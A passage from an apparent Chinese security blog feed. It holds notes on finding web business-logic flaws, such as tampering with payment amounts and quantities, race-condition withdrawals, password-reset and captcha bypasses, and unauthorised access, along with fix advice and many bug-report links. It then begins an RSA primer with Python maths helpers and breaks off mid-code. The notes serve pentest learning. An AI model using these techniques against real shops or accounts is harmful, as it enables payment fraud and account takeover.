    <content><![CDATA[<h2 id="逻辑漏洞挖掘学习（总结完善）"><a href="#逻辑漏洞挖掘学习（总结完善）" class="headerlink" title="逻辑漏洞挖掘学习（总结完善）"></a>逻辑漏洞挖掘学习（总结完善）</h2><blockquote>
<p>近学习了一下挖逻辑漏洞，针对逻辑漏洞学习到的点做一下总结，主要以看思路和漏洞实例在 学习，参考链接就是总结中的链接以及与这些链接相关的网站，太多了，就直接在文章总列举出 来了。逻辑漏洞的挖掘主要还是在数据包的各个参数上，一定要细心。</p>
</blockquote>
<h3 id="工具：BurpSuit-主要的逻辑漏洞的挖掘工具"><a href="#工具：BurpSuit-主要的逻辑漏洞的挖掘工具" class="headerlink" title="工具：BurpSuit(主要的逻辑漏洞的挖掘工具)"></a>工具：BurpSuit(主要的逻辑漏洞的挖掘工具)</h3><h3 id="思路：复杂灵活"><a href="#思路：复杂灵活" class="headerlink" title="思路：复杂灵活"></a>思路：复杂灵活</h3><h3 id="核心：绕过真实身份认证或者正常业务流程达到预期目的"><a href="#核心：绕过真实身份认证或者正常业务流程达到预期目的" class="headerlink" title="核心：绕过真实身份认证或者正常业务流程达到预期目的"></a>核心：绕过真实身份认证或者正常业务流程达到预期目的</h3><h3 id="用户身份：认证（用户身份特性认证）"><a href="#用户身份：认证（用户身份特性认证）" class="headerlink" title="用户身份：认证（用户身份特性认证）"></a>用户身份：认证（用户身份特性认证）</h3><ul>
<li>本地认证</li>
<li>服务端认证</li>
</ul>
<h3 id="业务流程：对业务流程的熟悉程度（各类型网站-业务模式）"><a href="#业务流程：对业务流程的熟悉程度（各类型网站-业务模式）" class="headerlink" title="业务流程：对业务流程的熟悉程度（各类型网站+业务模式）"></a>业务流程：对业务流程的熟悉程度（各类型网站+业务模式）</h3><ul>
<li>制定漏洞模型</li>
<li>重点业务功能区：个人信息区域、密码修改区域、密码忘记区域、支付区域、手机号区域等</li>
</ul>
<h3 id="逻辑漏洞的类型："><a href="#逻辑漏洞的类型：" class="headerlink" title="逻辑漏洞的类型："></a>逻辑漏洞的类型：</h3><h4 id="支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）"><a href="#支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）" class="headerlink" title="支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）"></a>支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）</h4><h5 id="订单："><a href="#订单：" class="headerlink" title="订单："></a>订单：</h5><ul>
<li>选择商品时修改商品的价格（也可以在确认订单的时候修改订单，可以改小或者改为负数）</li>
<li>选择商品时更改商品的数量（如设置为负数）<ul>
<li>比如在一个服务器购买网站，他们的硬盘是按G来算的，就好像1G只要1元(假设)，2G只要2元，以此类推，比如那个服务器总共需要200元，我们是否可以修改G的数量来减少支付价格呢，比如我们把G改成-19</li>
</ul>
</li>
<li>商品剩余为一件时，多人同时购买是否产出冲突</li>
<li>生成订单时修改订单的金额</li>
<li>商品为0时是否还可以购买</li>
</ul>
<h5 id="结算："><a href="#结算：" class="headerlink" title="结算："></a>结算：</h5><ul>
<li>优惠活动时打折、优惠券的多次使用<ul>
<li>比如在某商城活动的时候领取优惠券，20元的产品规定只能使用5元的，可以修改为15元等</li>
<li><a href="https://www.secpulse.com/archives/40336.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/40336.html</a></li>
</ul>
</li>
<li>截断数据包，结算的时候修改订单数量、金额<ul>
<li>比如A产品100元，改为-90元</li>
<li>在很多时候，我们都忽略了一个问题，那就是在购买一件商品的时候，我们都喜欢修改成0.01或者负数，但是这里是有一个积分的，就是比如我们在购买1元产品的时候可以获得100积分，但是我们如果将金额数小于1元的话积分就肯定是为空的了，因为这里的积分是按100/元来算的，也就是说，如果我们看到购买xx元有送积分的，我们可以来尝试一下把金额数改成积分最低数，就比如1元。</li>
<li>比如我们在某网站，他们用的是自家的钱包(迷你钱包),这个钱包作用也仅是用于这一个站，在提现时，没有任何验证码或者校验机制，只要输入体现金额就可以提现，并且是秒到账，如果什么负数，修改金额都测试过了都不行，那么你就可以试试多线程并发问题,提现时抓包，比如我现在钱包内有0.1元，那么按理说每提0.01可以提现10次，也就是发送10次进程，但是利用这个问题可以达到多发现几次成功的进程，提现时抓包，然后把数据包发送到BurpSuite工具的Intruder当中，进行批量发送18次，然后可以看到成功的提现到了12次（并发、数据库操作加锁）</li>
<li>比如a产品为999元，当我们购买的时候我们可以试试修改数量成-1个，看是否有变成-999元，我们点击支付一下，一般来说，都可能支付失败的，因为这个时候服务器验证了这个价格是否和服务器中对应的价格是否一样，此时我们可以将-999元的产品放到购物车，再去此网站购买一个1000元产品的购物车，然后我们可以来点击购买，可以看到支付价格就变成了1元(1000+(-999)=1)了</li>
</ul>
</li>
<li>截断数据包，结算的时候修改支付方式（第三方的支付接口逻辑设计不严格就会产生）<ul>
<li>比如将百度钱包的接口、微信支付等改为一个其他的接口，如果逻辑设计不严格就会产生漏洞</li>
</ul>
</li>
<li>伪造订单，刷单<ul>
<li>例如：在购买一个产品的时候，目标程序时用过A参数判断是否支付，比如A=1实时表示支付，A=0时表示未支付，通过修改可控的A来验证是否可以伪造订单、等。</li>
</ul>
</li>
<li>重复支付（请求重放、多次下单）<ul>
<li>比如一些商场中有一些试用卡之类的，通过某种渠道获得的(比如签到，分享网站信息，购买某个商品送来的)，当我们试用的时候主动取消试用，那么这个时候试用卡可能会返回到我们账户中，这里的问题就是如果没有进行对订单多重提交的校验，那么就可导致无限制刷牌子。</li>
<li>比如，我在试用某个产品的时候，每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的牌子数量到账户当中，这就构成了无限制刷得问题</li>
</ul>
</li>
<li>越权支付<ul>
<li>比如我们在购买某产品的时候，支付时会出现当前用户的ID，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品</li>
</ul>
</li>
<li>参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值</li>
</ul>
<h5 id="支付漏洞突破口："><a href="#支付漏洞突破口：" class="headerlink" title="支付漏洞突破口："></a>支付漏洞突破口：</h5><ul>
<li>截断数据包，伪造第三方的确认信息</li>
<li>绕过商家确认直接退货</li>
<li>绕过商品类型直接退货（退货是否被允许，比如虚拟商品，话费等）</li>
<li>绕过客户端验证直接确认收货</li>
</ul>
<h5 id="支付漏洞实例："><a href="#支付漏洞实例：" class="headerlink" title="支付漏洞实例："></a>支付漏洞实例：</h5><ul>
<li><a href="https://www.0dayhack.com/post-832.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-832.html</a></li>
<li><a href="https://www.bigniu.com/bug/view/935" target="_blank" rel="noopener">https://www.bigniu.com/bug/view/935</a></li>
<li><a href="https://www.bigniu.com/bug/view/929" target="_blank" rel="noopener">https://www.bigniu.com/bug/view/929</a></li>
<li><a href="https://www.secpulse.com/archives/47665.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/47665.html</a></li>
<li><a href="https://www.secpulse.com/archives/41144.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41144.html</a></li>
<li><a href="https://www.secpulse.com/archives/39768.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/39768.html</a></li>
<li><a href="https://www.secpulse.com/archives/36412.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/36412.html</a></li>
<li><a href="https://www.secpulse.com/archives/35976.html（绕过手机号验证的多种方式）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35976.html（绕过手机号验证的多种方式）</a></li>
<li><a href="https://www.secpulse.com/archives/35701.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35701.html</a></li>
<li><a href="https://www.secpulse.com/archives/35188.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35188.html</a></li>
<li><a href="http://www.freebuf.com/vuls/151196.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/151196.html</a></li>
</ul>
<h5 id="支付漏洞修复方案："><a href="#支付漏洞修复方案：" class="headerlink" title="支付漏洞修复方案："></a>支付漏洞修复方案：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">和银行交易时，做数据签名，对用户金额和订单签名。</span><br><span class="line">敏感参数不要明文放在URL中</span><br><span class="line">服务端效验客户端提交的参数</span><br><span class="line">在服务端计算金额的时候，一定要判断是否为正数。</span><br><span class="line">支付过程中加一个服务器生成的key，用户校验参数有没有被串改。</span><br><span class="line">如果一定需要用URL传递相关参数，建议进行后端的签名验证</span><br><span class="line">订单金额和充值接口返回的数据进行校验</span><br><span class="line">提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。</span><br><span class="line">支付时应从服务器拉取数据，而不是直接读客户端的值！！</span><br></pre></td></tr></table></figure>
<h4 id="密码重置漏洞："><a href="#密码重置漏洞：" class="headerlink" title="密码重置漏洞："></a>密码重置漏洞：</h4><h5 id="用户密码找回方式："><a href="#用户密码找回方式：" class="headerlink" title="用户密码找回方式："></a>用户密码找回方式：</h5><ul>
<li>手机短信验证码<ul>
<li><a href="https://www.secpulse.com/archives/36619.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/36619.html</a></li>
<li><a href="https://www.secpulse.com/archives/35564.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35564.html</a></li>
<li><a href="https://www.secpulse.com/archives/35488.html（直接改返回包）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35488.html（直接改返回包）</a></li>
<li><a href="https://www.secpulse.com/archives/35169.html（通过越权修改）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35169.html（通过越权修改）</a></li>
<li><a href="https://www.secpulse.com/archives/35023.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35023.html</a></li>
<li><a href="https://www.secpulse.com/archives/34710.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/34710.html</a></li>
<li><a href="https://www.secpulse.com/archives/33800.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/33800.html</a></li>
</ul>
</li>
<li>邮箱（密码找回链接）</li>
<li>自动生成新密码</li>
</ul>
<h5 id="密码重置突破口："><a href="#密码重置突破口：" class="headerlink" title="密码重置突破口："></a>密码重置突破口：</h5><ul>
<li>认证凭证暴力破解（多数为验证码4位及以下的纯数字，验证码时间长，不失效可爆破）<ul>
<li><a href="https://bysec.io/detailsMasked.pyp?id=5" target="_blank" rel="noopener">https://bysec.io/detailsMasked.pyp?id=5</a></li>
<li><a href="https://www.secpulse.com/archives/41168.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41168.html</a></li>
</ul>
</li>
<li>认证凭证回显（明文传输）<ul>
<li><a href="https://www.secpulse.com/archives/49496.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/49496.html</a></li>
</ul>
</li>
<li>认证凭证重复使用（比如验证码重复使用）</li>
<li>重新绑定（如重新绑定邮箱、手机号且自己可控）<ul>
<li><a href="https://www.test404.com/post-1352.html?wafcloud_antihack=2" target="_blank" rel="noopener">https://www.test404.com/post-1352.html?wafcloud_antihack=2</a></li>
<li><a href="https://xz.aliyun.com/t/2011（密码重置里面、越权）" target="_blank" rel="noopener">https://xz.aliyun.com/t/2011（密码重置里面、越权）</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-23318-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23318-1-1.html</a></li>
</ul>
</li>
<li>用户身份特性认证（token生成可控）</li>
<li>服务器端认证为空、直接删除验证码、或者认证的特征值可控：<ul>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23343（直接改为修改密码验证的特征值）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23343（直接改为修改密码验证的特征值）</a></li>
</ul>
</li>
<li>本地认证、修改返回值<ul>
<li><a href="https://www.secpulse.com/archives/37864.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/37864.html</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-23319-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23319-1-1.html</a></li>
</ul>
</li>
<li>删除校验码绕过</li>
<li>cookie覆盖<ul>
<li><a href="https://bbs.ichunqiu.com/thread-38176-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-38176-1-1.html</a></li>
</ul>
</li>
</ul>
<h4 id="任意用户登录："><a href="#任意用户登录：" class="headerlink" title="任意用户登录："></a>任意用户登录：</h4><ul>
<li>空密码绕过（绕过前端改为空值）</li>
<li>身份替换（登录成功产生session）</li>
<li>认证凭证绕过</li>
<li>枚举、越权<ul>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=24146（通过修改请求头里面的参数进行时间限制的绕过）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=24146（通过修改请求头里面的参数进行时间限制的绕过）</a></li>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614（通过修改cookie值来绕过验证码时间限制造成短信轰炸）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614（通过修改cookie值来绕过验证码时间限制造成短信轰炸）</a></li>
</ul>
</li>
</ul>
<h4 id="认证缺陷漏洞："><a href="#认证缺陷漏洞：" class="headerlink" title="认证缺陷漏洞："></a>认证缺陷漏洞：</h4><ul>
<li>弱验证</li>
<li>空验证</li>
<li>认证凭证有效性、唯一性<ul>
<li><a href="http://www.heavensec.org/index.php/1613.html" target="_blank" rel="noopener">http://www.heavensec.org/index.php/1613.html</a></li>
</ul>
</li>
</ul>
<h5 id="身份验证码之暴力破解-（https-bbs-ichunqiu-com-thread-45640-1-1-html）"><a href="#身份验证码之暴力破解-（https-bbs-ichunqiu-com-thread-45640-1-1-html）" class="headerlink" title="身份验证码之暴力破解  （https://bbs.ichunqiu.com/thread-45640-1-1.html）"></a>身份验证码之暴力破解  （<a href="https://bbs.ichunqiu.com/thread-45640-1-1.html）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-45640-1-1.html）</a></h5><ul>
<li>无防护措施（没有对登录、注册、重置密码之类的功能进行一定的防护，所以当碰到没有验证码的，没有对输错密码次数进行限制，而且还是明文传输的系统，先可以考虑爆破）</li>
<li>锁定机制——&gt;撞库（有些系统会有一些防护措施，比如超过一定的错误次数会将账号进行锁定，或者是某IP频繁的进行登录操作会封IP，这是后可以进行撞库，用弱密码遍历用户名；有些限制并没有在后台验证，也可以加入XFF等方式绕过）<ul>
<li>修复：限制单位时间内执行某项操作的次数，要对限制的方法、次数等进行详细的说明，限制的验证也应该再服务端</li>
</ul>
</li>
<li>验证码（可以防止自动化攻击）<ul>
<li>图片验证码——&gt;绕过（图片验证码反复使用、验证码在前端校验、验证码可识别、验证码在客户端传输）</li>
<li>短信验证码——&gt;爆破/绕过（与图片类似）</li>
<li>修复：所有的验证码生存周期都应该是一次性的，无论校验成功与失败，且验证码加入干扰线，变形等防止机器识别，对于可爆破的参数加上人机识别，通过设置的阀值来判断；同时验证过程不应将有助于推测正确验证答案的信息返回到客户端。</li>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23909" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23909</a></li>
</ul>
</li>
</ul>
<h4 id="越权："><a href="#越权：" class="headerlink" title="越权："></a>越权：</h4><ul>
<li><p>水平越权</p>
<ul>
<li><p>实例：</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.bigniu.com/bug/view/926</span><br><span class="line">https://xz.aliyun.com/t/2011</span><br><span class="line">https://www.secpulse.com/archives/41142.html</span><br><span class="line">https://www.secpulse.com/archives/38473.html</span><br><span class="line">https://www.secpulse.com/archives/35169.html</span><br><span class="line">https://bbs.ichunqiu.com/thread-39287-1-1.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0196245.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0194518.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193632.html(越权删除+敏感信息泄露)</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192676.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192848.html（越权任意用户修改+信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权修改+密码重置）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191930.html（整站越权+通过组合越权获取所有信息）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191192.html（爆破+越权）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0190106.html（绕过signature字段达到越权）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189823.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0188760.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0187544.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>垂直越权</p>
<ul>
<li><p>实例：</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2011</span><br><span class="line">https://www.secpulse.com/archives/41174.html</span><br><span class="line">https://www.secpulse.com/archives/37083.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189507.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>未授权访问（登录凭证验证）</p>
</li>
<li><p>绕过授权模式（参数构造）</p>
</li>
</ul>
<h4 id="敏感信息泄露："><a href="#敏感信息泄露：" class="headerlink" title="敏感信息泄露："></a>敏感信息泄露：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.bigniu.com/bug/view/930</span><br><span class="line">https://www.bigniu.com/bug/view/928</span><br><span class="line">https://www.bigniu.com/bug/view/927</span><br><span class="line">https://www.secpulse.com/archives/47842.html</span><br><span class="line">https://www.secpulse.com/archives/47482.html</span><br><span class="line">https://www.secpulse.com/archives/42603.html</span><br><span class="line">https://www.secpulse.com/archives/41375.html</span><br><span class="line">https://www.secpulse.com/archives/41253.html</span><br><span class="line">https://www.secpulse.com/archives/41144.html</span><br><span class="line">https://www.secpulse.com/archives/40909.html</span><br></pre></td></tr></table></figure>
<h4 id="接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历"><a href="#接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历" class="headerlink" title="接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历"></a>接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历</h4><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><blockquote>
<p>在学习过程中对于遇见的一些新学习到的业务逻辑测试方法的总结</p>
</blockquote>
<h3 id="争对客户端刷新验证码的绕过"><a href="#争对客户端刷新验证码的绕过" class="headerlink" title="争对客户端刷新验证码的绕过"></a>争对客户端刷新验证码的绕过</h3><ol>
<li><p>在一些有验证码的站点，每次进行验证的验证码都是通过第三方的接口调用的，有些验证码是通过<img src>加载的，这个时候直接访问加载的地址显示直接就是验证码，所以，正对这种验证码的刷新就可以通过拦截数据包，刚好卡在验证码链接跳转的那一步，进行重放，通过这种方法来绕过。这里通过漏洞银行直播中的两张图来说明</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539268118.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539265914.99.png" alt></p>
</li>
</ol>
<h3 id="对于滑动验证码的的绕过"><a href="#对于滑动验证码的的绕过" class="headerlink" title="对于滑动验证码的的绕过"></a>对于滑动验证码的的绕过</h3><ol>
<li>现在有好多网站都是滑动验证码，在学习了漏洞银行直播中的业务逻辑挖掘做一个笔记：<ol>
<li>首先在滑动验证码哪里查看JS代码，看一下JS代码，看组件是怎么构造加载的，然后确定滑动验证码需要的一些参数</li>
<li>curl 等方式获取页面，查找一些需要的参数</li>
<li>通过获取的参数构造正常滑动以后的链接作为payload</li>
<li>通过curl 访问payload获取数据<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539266990.35.png" alt></li>
</ol>
</li>
</ol>
<h3 id="net-Nlog日志泄露"><a href="#net-Nlog日志泄露" class="headerlink" title=".net  Nlog日志泄露"></a>.net  Nlog日志泄露</h3><ol>
<li>对于现在许多.net的网站，一般在遇到.net的网站访问一些目录时报404/403等，就会放弃。其实.net的网站有Nlog日志，通过Nlog的特性构造一些payload就可以访问有些站点的Nlog日志，里面可能会包含敏感信息。<ol>
<li>关于Nlog的特性一下文章有说明：<a href="http://www.cnblogs.com/felixnet/p/5498759.html" target="_blank" rel="noopener">http://www.cnblogs.com/felixnet/p/5498759.html</a></li>
<li>关于payload主要就是拼接当前的一些时间等关键值</li>
</ol>
</li>
</ol>
<h3 id="xxe接口越权"><a href="#xxe接口越权" class="headerlink" title="xxe接口越权"></a>xxe接口越权</h3><ol>
<li>xxe的越权，这里还是一些网站使用的接口权限设置不当造成的，路劲可以通过dirb探测等等。</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>渗透测试</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA总结</title>
    <url>/2018/09/02/RSA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="关于RSA的一些总结"><a href="#关于RSA的一些总结" class="headerlink" title="关于RSA的一些总结"></a>关于RSA的一些总结</h2><blockquote>
<p>最近一段时间比赛比较多，密码学的题也是各种各样的，有时候会碰到RSA，想想上学期学的数论，RSA就讲了整整一个月，最后发现代码上还是应用不了，就像没学一样，毕竟在实际生活中好多加密算法都是设计好的。为了让学过的东西不要白学，抽点时间结合题目，对RSA进行一下总结，网上好多关于RSA的文章写的都挺好的，但还是喜欢自己动手做一遍。本文没有啥原创的东西，主要是对学习的一个记录。</p>
</blockquote>
<h3 id="RSA简介："><a href="#RSA简介：" class="headerlink" title="RSA简介："></a>RSA简介：</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535850694.5.png" alt></p>
<ul>
<li><p>上图是对RSA算法非对称加解密的一个描述，也是RSA算法最根本的东西，下面说一下RSA算法被攻击的可能性（有没有在知道公钥的情况下推导出私钥）</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535851071.47.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要知道的理论是：</span><br><span class="line">    ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。 </span><br><span class="line">    φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。 </span><br><span class="line">    n=pq。只有将n因数分解，才能算出p和q。</span><br><span class="line">所以：如果n可以被分解，那就可以推到出d,私钥就可以被破解，但实际上p,q是大素数，分解是很困难的</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些理论支撑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">欧拉函数：φ(n)是小于等于n的数中与n互质的数的数目</span><br><span class="line">欧拉函数是积性函数——若p,q互质，φ(p*q)= φ(p) *φ(q) </span><br><span class="line">若p为质数，则φ(p)=p-1</span><br><span class="line"></span><br><span class="line">同余定理：给定一个正整数m，如果两个整数a和b满足（a-b）能够被m整除，即（a-b）/m得到一个整数，那么就称整数a与b对模m同余，记作a≡b(mod m)。 </span><br><span class="line">性质： </span><br><span class="line">1 自反性 a≡a (mod m) </span><br><span class="line">2 对称性 若a≡b(mod m)，则b≡a (mod m) </span><br><span class="line">3 传递性 若a≡b (mod m)，b≡c (mod m)，则a≡c (mod m) </span><br><span class="line">4 同余式相加 若a≡b (mod m)，c≡d(mod m)，则a+-c≡b+-d (mod m) </span><br><span class="line">5 同余式相乘 若a≡b (mod m)，c≡d(mod m)，则ac≡bd (mod m)</span><br><span class="line"></span><br><span class="line">求逆元：指有一个整数d，可以使得e*d被φ(n)除的余数为1，即e*d ≡ 1 (mod φ(n))，这个式子等于e*d - 1 = k*φ(n)</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些程序代码上的支撑：（都是用python实现算法的应用）</p>
<ul>
<li><p>快速幂取模：等价于pow方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod</span><span class="params">(c,d,n)</span>:</span><span class="comment">#等价于自带的pow(c,d,n)</span></span><br><span class="line">    r=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> d&gt;<span class="number">0</span>:</span><br><span class="line">        c=c%n</span><br><span class="line">        <span class="keyword">if</span> d&amp;<span class="number">1</span>:</span><br><span class="line">            r=(r*c)%n</span><br><span class="line">        d&gt;&gt;=<span class="number">1</span></span><br><span class="line">        c=(c*c)%n</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure>
</li>
<li><p>模逆运算（就是求逆元，主要基于扩展欧几里得算法）</p>
<ul>
<li><p>python实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">     <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         x , y , q = egcd( b , a % b ) 	 <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">         x , y = y, ( x - (a // b) * y )</span><br><span class="line">         <span class="keyword">return</span> x, y, q </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> egcd(a,b)[<span class="number">0</span>]%b 				<span class="comment">#求a模b得逆元</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>出来通过自己编写实现之外还可以通过gmpy2和libnum这两个库函数实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span>  libnum <span class="keyword">import</span> invmod</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">print</span> invmod(<span class="number">47</span>,<span class="number">30</span>)</span><br><span class="line"><span class="keyword">print</span> gmpy2.invert(<span class="number">47</span>,<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535852949.7.png" alt></p>
</li>
</ul>
</li>
<li><p>欧几里得算法：就是求最大公约数，<code>gcd(a,b)==gcd(b,a%b),(b!=0)</code> 和 <code>gcd(a,0)==a</code>有递归实现和迭代实现两种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">else</span> gcd(b, a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd2</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
</li>
<li><p>扩展欧几里得算法：本质上就是将欧几里得算法求最大公约数的过程最后转化为线性表达式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_euclid</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x1 , y1 , q = ext_euclid( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">        x , y = y1, ( x1 - (a // b) * y1 )</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    s1, s2 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    r, q = a % b, a / b</span><br><span 